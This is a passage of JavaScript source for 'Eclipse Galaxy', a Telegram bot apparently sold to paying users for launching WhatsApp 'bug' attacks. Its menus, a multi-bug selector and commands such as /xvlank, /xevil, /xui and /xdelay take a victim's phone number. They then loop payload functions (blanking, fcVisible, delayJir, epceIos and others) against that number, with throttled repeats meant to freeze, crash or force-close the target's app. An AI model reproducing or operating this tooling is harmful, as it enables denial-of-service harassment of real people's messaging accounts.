          buatButtonWarna("(💀) Invisible Menu", "invisbug", "primary")
        ]
      ];
    }
    
    else if (data === "toolsmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.tools;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🛠) ＴＯＯＬＳ ＭＥＮＵ
───────────────────────
✶ /convert - reply media
✶ /tiktokdl - link
✶ /gita - gita ai
✶ /gita help - helping gita
✶ /gptosscust - ai gpt
✶ /gptoss help - helping gpt
✶ /bible - ai bible
✶ /bible help - helping
✶ /glm help - helping ai

\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger")
        ]
      ];
    }
    
    else if (data === "tqto") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.tqto;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(👁) ＴＨＡＮＫＳ ＴＯ
───────────────────────
𖤝 Seren ( @Serenhopee ) - Main Dev
𖤝 Cosmo ( @raysofbeam ) - My Bestfriend
𖤝 Wolf ( @ib_grdkdkdkjdy6kakggejj ) - Supp
𖤝 Xata ( @Xatanicvxii ) - Supp
𖤝 ALL BUYER ECLIPSE GALAXY!!
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }

    else if (data === "ownermenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.owner;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(⚙️) ＣＯＮＴＲＯＬＬ ＭＥＮＵ
───────────────────────
ⓘ /addprem - id duration
ⓘ /delprem - id
ⓘ /listprem
ⓘ /addadmin - id
ⓘ /deladmin - id
ⓘ /addbot 628xxx
ⓘ /delbot 628xxx
ⓘ /setcd - 10s
ⓘ /resetcd
ⓘ /autoupdate - auto update on
ⓘ /offautoupdate - auto update off
ⓘ /update - manual update
ⓘ /version - cek versi
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "mainmenu", "danger")
        ]
      ];
    }
    
    else if (data === "custombugmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.custom;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}

(🎨) ＣＵＳＴＯＭ ＢＵＧ
───────────────────────
Gunakan format:
/custombug 628xxx
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(⬅️) Back", "bugmenu", "danger")
        ]
      ];
    }

    else if (data === "mainmenu") {
      await bot.deleteMessage(chatId, messageId);
      imageToUse = menuImages.main;
      newCaption = `\`\`\`JavaScript
ⓘ hello 👋🏻 ${usn}, my name is Eclipse Galaxy! i was created by @Serenhopee to be your bug assistant! don't abuse it.

(🪐) ＥＣＬＩＰＳＥ ＧＡＬＡＸＹ
───────────────────────
⚘. Creator: @Serenhopee
⚘. Version: ${CURRENT_VERSION}
⚘. Runtime: ${runtime}
    
press the button to show other menu .ᐟ
\`\`\``;

      newButtons = [
        [
          buatButtonWarna("(🧬) Eclipse Menu", "bugmenu", "primary"),
          buatButtonWarna("(⚙️) Controll Menu", "ownermenu", "success")
        ],
        [
          buatButtonWarna("(👁) Thanks To", "tqto", "danger")
        ],
        [
          buatButtonUrlWarna("(❕) Channel Information", "https://t.me/SerenEclipse", "primary")
        ]
      ];
    }

    // ========== HANDLE MULTI BUG SELECTION ==========
    else if (data.startsWith("multibug_")) {
      const parts = data.split("_");
      const action = parts[1];
      const bugId = parts[2];
      
      if (action === "select") {
        // Inisialisasi kalo belum ada
        if (!multiBugSelections[userId]) {
          multiBugSelections[userId] = {
            nomor: null,
            selectedBugs: []
          };
        }
        
        // Toggle pilihan bug
        const index = multiBugSelections[userId].selectedBugs.indexOf(bugId);
        if (index === -1) {
          if (multiBugSelections[userId].selectedBugs.length < 8) {
            multiBugSelections[userId].selectedBugs.push(bugId);
          }
        } else {
          multiBugSelections[userId].selectedBugs.splice(index, 1);
        }
        
        // Update tampilan dengan foto
        await updateMultiBugMenu(chatId, messageId, userId);
      }
      else if (action === "confirm") {
        await bot.deleteMessage(chatId, messageId);
        await bot.sendPhoto(chatId, menuImages.multi, {
          caption: "*🚀 MULAI MULTI BUG*",
          parse_mode: "Markdown"
        });
        
        if (multiBugSelections[userId] && multiBugSelections[userId].selectedBugs.length >= 1) {
          const selected = multiBugSelections[userId].selectedBugs;
          const nomor = multiBugSelections[userId].nomor;
          const target = `${nomor}@s.whatsapp.net`;
          const sock = sessions.values().next().value;
          
          let progressMsg = await bot.sendPhoto(
            chatId,
            menuImages.multi,
            {
              caption: `\`\`\`PROGRESS MULTI BUG\nTarget: ${nomor}\nTotal Bug: ${selected.length}\n\nMemulai...\`\`\``,
              parse_mode: "Markdown"
            }
          );
          
          for (let i = 0; i < selected.length; i++) {
            const bug = selected[i];
            await bot.editMessageMedia(
              {
                type: "photo",
                media: menuImages.multi,
                caption: `\`\`\`PROGRESS MULTI BUG*\nTarget: ${nomor}\nProgress: ${i+1}/${selected.length}\nSedang menjalankan: ${bug.toUpperCase()}\`\`\``
              },
              { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "Markdown" }
            );
            
            // Jalankan bug sesuai pilihan
            switch(bug) {
              case "xvlank":
                for (let j = 0; j < 10; j++) await blanking(sock, target);
                break;
              case "xevil":
                for (let j = 0; j < 10; j++) await fcVisible(sock, target);
                break;
              case "xui":
                for (let j = 0; j < 10; j++) await fcColi(sock, target);
                break;
              case "xdelay":
                for (let j = 0; j < 10; j++) await delayJir(sock, target);
                break;
              case "xinvis":
                for (let j = 0; j < 10; j++) await delayJir(sock, target);
                break;
              case "Ios":
                for (let j = 0; j < 10; j++) await epceIos(sock, target);
                break;
            }
            
            await sleep(2000);
          }
          
          await bot.editMessageMedia(
            {
              type: "photo",
              media: menuImages.multi,
              caption: `\`\`\`✅ MULTI BUG SELESAI*\nTarget: ${nomor}\nTotal Bug: ${selected.length}\nSemua bug telah dijalankan!\`\`\``
            },
            { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "Markdown" }
          );
          
          delete multiBugSelections[userId];
        }
      }
      else if (action === "cancel") {
        delete multiBugSelections[userId];
        await bot.deleteMessage(chatId, messageId);
        await bot.sendPhoto(chatId, menuImages.multi, {
          caption: "❌ Multi bug dibatalkan",
          parse_mode: "Markdown"
        });
      }
    }

    if (newCaption) {
      setTimeout(async () => {
        await bot.sendPhoto(chatId, imageToUse, {
          caption: newCaption,
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: newButtons }
        });
      }, 1500);
    }

    await bot.answerCallbackQuery(callbackQuery.id);

  } catch (err) {
    console.log("❌ CALLBACK ERROR:", err);
  }
});

// ========== FUNGSI UPDATE MENU MULTI BUG ==========
async function updateMultiBugMenu(chatId, messageId, userId) {
  const data = multiBugSelections[userId];
  const selectedCount = data.selectedBugs.length;
  const nomor = data.nomor;
  
  let bugButtons = [];
  let row = [];
  
  // Buat button untuk setiap bug dengan status ⬜/✅
  availableBugs.forEach((bug, index) => {
    const isSelected = data.selectedBugs.includes(bug.id);
    const status = isSelected ? "✅ " : "⬜ ";
    const button = buatButtonWarna(
      `${status}${bug.emoji} ${bug.name}`,
      `multibug_select_${bug.id}`,
      bug.style
    );
    
    row.push(button);
    
    if (row.length === 2 || index === availableBugs.length - 1) {
      bugButtons.push(row);
      row = [];
    }
  });
  
  // Tambah tombol konfirmasi
  bugButtons.push([
    buatButtonWarna(`🚀 MULAI (${selectedCount} Bug)`, "multibug_confirm", "success"),
    buatButtonWarna("❌ BATAL", "multibug_cancel", "danger")
  ]);
  
  const keyboard = { inline_keyboard: bugButtons };
  
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.multi,
      caption: `CUSTOM BUG SELECTION\n\n` +
      `Target: ${nomor}\n` +
      `Pilih minimal 1 jenis bug (max 8):\n\n` +
      `⬜ = Belum dipilih\n✅ = Terpilih\n\n` +
      `Terpilih: ${selectedCount} bug`
    },
    {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: keyboard
    }
  );
}

// ========== COMMAND MULTI BUG ==========
bot.onText(/^\/custombug (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  
  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Dev", url: "https://t.me/Serenhopee" }]
        ]
      }
    });
  }
  
  // Cek koneksi WhatsApp
  if (sessions.size === 0) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: "Tolol jir, sendernya aja gada bego! add dlu lah pake /addbot 62xxx",
      parse_mode: "Markdown"
    });
  }
  
  // Simpan data
  multiBugSelections[userId] = {
    nomor: formattedNumber,
    selectedBugs: []
  };
  
  // Buat menu pilihan bug
  let bugButtons = [];
  let row = [];
  
  availableBugs.forEach((bug, index) => {
    const button = buatButtonWarna(
      `⬜ ${bug.emoji} ${bug.name}`,
      `multibug_select_${bug.id}`,
      bug.style
    );
    
    row.push(button);
    
    if (row.length === 2 || index === availableBugs.length - 1) {
      bugButtons.push(row);
      row = [];
    }
  });
  
  bugButtons.push([
    buatButtonWarna("🚀 MULAI (0 Bug)", "multibug_confirm", "success"),
    buatButtonWarna("❌ BATAL", "multibug_cancel", "danger")
  ]);
  
  const keyboard = { inline_keyboard: bugButtons };
  
  await bot.sendPhoto(
    chatId,
    menuImages.multi,
    {
      caption: `\`\`\` MULTI BUG SELECTION\n\n` +
      `Target: ${formattedNumber}\n` +
      `Pilih minimal 1 jenis bug (max 8):\n\n` +
      `⬜ = Belum dipilih\n✅ = Terpilih\`\`\``,
      parse_mode: "Markdown",
      reply_markup: keyboard
    }
  );
});

//======( FUNCTION PRIVATE )======\\

//===°====PARAMS========\\
async function blanking(sock, target) {
  for (let i = 0; i < 25; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await infiniteMedia(sock, target);
    await xCursedBlank(target);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fcVisible(sock, target) {
  for (let i = 0; i < 19; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await uno(target);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fcColi(sock, target) {
  for (let i = 0; i < 20; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await ATRStc(sock, target);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function delayJir(sock, target) {
  for (let i = 0; i < 50; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedSql(target);
    await xCursedSql(target);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function epceIos(sock, target) {
  for (let i = 0; i < 200; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await FreezForclose(sock, target);
    await FreezForclose(sock, target);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

async function fzIos(sock, jid) {
  for (let i = 0; i < 100; i++) {
  const batchIndex = Math.floor(i / 25);
  const baseDelay = 3500;
  const increasePerBatch = 3500;
  const maxDelay = 49000;
  let currentDelay = baseDelay + batchIndex * increasePerBatch;
  if (currentDelay > maxDelay) currentDelay = maxDelay;
  try {
    await xCursedFzIos(sock, jid);
    await xCursedIOS(sock, jid);
    await xCursedIOSX(sock, jid);
  } catch (e) {
    console.error("Send error:", e);
  }

  await new Promise((r) => setTimeout(r, currentDelay));
  if (i > 0 && i % 50 === 0) {
    console.log(
      `[${new Date().toLocaleTimeString()}] Batch ${batchIndex + 1} selesai | jeda ${(currentDelay / 1000).toFixed(1)}s | istirahat 2 menit`
    );
    await new Promise((r) => setTimeout(r, 2 * 60 * 1000));
    }
  }
}

//=======CASE BUG LENGKAP (SEMUA COMMAND)=========//

// ========== COMMAND XCURSED ==========
bot.onText(/^\/xvlank (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /xvlank 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await blanking(sock, target);
   }
});

// ========== COMMAND ECLIPSE ==========
bot.onText(/^\/xevil (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /xevil 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await fcVisible(sock, target);
   }
});

// ========== COMMAND APOCALYPSE ==========
bot.onText(/^\/xui (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.bug, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.bug, {
      caption: "Example: /xui 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.bug, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.bug,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await blanking(sock, target);
     await fcColi(sock, target);
     await fcVisible(sock, target);
   }
});

// ========== COMMAND XENON ==========
bot.onText(/^\/xdelay (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /xdelay 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, menuImages.main, {
      caption: `<blockquote><b>HEY BRO!! YOUR ID IS NOT ALLOWED TO THIS BOT! PLEASE ADD YOUR ID TO THIS BOT!!</b></blockquote>
<b>YOUR ID TELEGRAM : <code>${senderId}</code></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
            [{ text: "Dev", url: "https://t.me/Serenhopee" }]
         ]
      }
    });
  }
    
   if (sessions.size === 0) {
      return bot.sendPhoto(chatId, menuImages.main, {
        caption: "Tolol jir, senderny aja gada bego! add dlu lah pake /addbot 62xxx",
        parse_mode: "Markdown"
      });
    }
    
  bot.sendMessage(chatId, "️👁").then((msg) => {
  setTimeout(() => {
    bot.deleteMessage(chatId, msg.message_id);
  },1600);
});
  
  const progressStages = [
    "[░░░░░░░░░░] 0%",
    "[██░░░░░░░░] 20%",
    "[████░░░░░░] 40%",
    "[██████░░░░] 60%",
    "[████████░░] 80%",
    "[██████████] 100%"
  ];

 await new Promise(r => setTimeout(r, 2000));

  const sent = await bot.sendPhoto(chatId, menuImages.invis, {
    caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[0]}
\`\`\``,
    parse_mode: "Markdown"
  });

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise(r => setTimeout(r, 2000));
    await bot.editMessageCaption(
      `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Processing ϟ°
▢ Progress : ${progressStages[i]}
\`\`\``,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "Markdown"
      }
    );
  }
  
  await new Promise((r) => setTimeout(r, 1000));
  await bot.editMessageMedia(
    {
      type: "photo",
      media: menuImages.invis,
      caption: `\`\`\`
▢ Target: ${formattedNumber}
▢ Status: Successfully ϟ°
▢ Progress : [██████████] 100%
▢ All Right Reversed by Eclipse Galaxy!!
\`\`\``,
      parse_mode: "Markdown"
    },
    {
      chat_id: chatId,
      message_id: sent.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "‹check target›", url: `https://wa.me/${formattedNumber}` }]
        ]
      }
    }
  );
  
   for (let i = 0; i < 1; i++) {
     await delayJir(sock, target);
   }
});

// ========== COMMAND VOLTRA ==========
bot.onText(/^\/voxra (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const sock = sessions.values().next().value;
  
  if (cooldownDuration > 0) {
    const lastUsed = userCooldown.get(userId);
    const now = Date.now();

    if (lastUsed && now - lastUsed < cooldownDuration) {
      const remaining = Math.ceil(
        (cooldownDuration - (now - lastUsed)) / 1000
      );

      return bot.sendPhoto(chatId, menuImages.invis, {
        caption: `⏳ Masih cooldown ${remaining}s`,
        parse_mode: "Markdown"
      });
    }

    userCooldown.set(userId, now);
  }

  if (!targetNumber)
    return bot.sendPhoto(chatId, menuImages.invis, {
      caption: "Example: /voxra 62xxxx",
      parse_mode: "Markdown"
    });
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
